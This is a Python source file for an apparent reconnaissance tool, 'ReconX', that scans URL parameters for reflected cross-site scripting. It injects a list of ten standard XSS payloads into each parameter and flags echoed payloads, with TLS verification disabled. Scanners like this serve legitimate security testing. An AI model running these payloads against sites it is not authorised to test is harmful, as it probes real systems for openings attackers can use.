#!/usr/bin/env python3
"""
ReconX - XSS Scanner
"""

import requests
from typing import List, Dict
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

class XSSScanner:
    
    PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "'\"><script>alert('XSS')</script>",
        "<body onload=alert('XSS')>",
        "<iframe src='javascript:alert(\"XSS\")'>",
        "javascript:alert('XSS')",
        "<input autofocus onfocus=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
    ]
    
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.vulnerabilities = []
    
    def test_url(self, url: str) -> List[Dict]:
        """Test URL for XSS vulnerabilities"""
        print(f"\n[*] Testing {url} for XSS...")
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            print("[!] No parameters found in URL")
            return []
        
        vulns = []
        
        for param_name in params.keys():
            print(f"[*] Testing parameter: {param_name}")
            
            for payload in self.PAYLOADS:
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                
                try:
                    response = requests.get(test_url, timeout=self.timeout, verify=False)
                    
                    if payload in response.text:
                        vuln = {
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'type': 'Reflected XSS',
                            'severity': 'HIGH'
                        }
                        vulns.append(vuln)
                        print(f"[!] VULNERABLE: {param_name} with payload: {payload[:50]}...")
                        break
                    
                except Exception as e:
                    print(f"[!] Error testing {param_name}: {str(e)}")
                    continue
        
        return vulns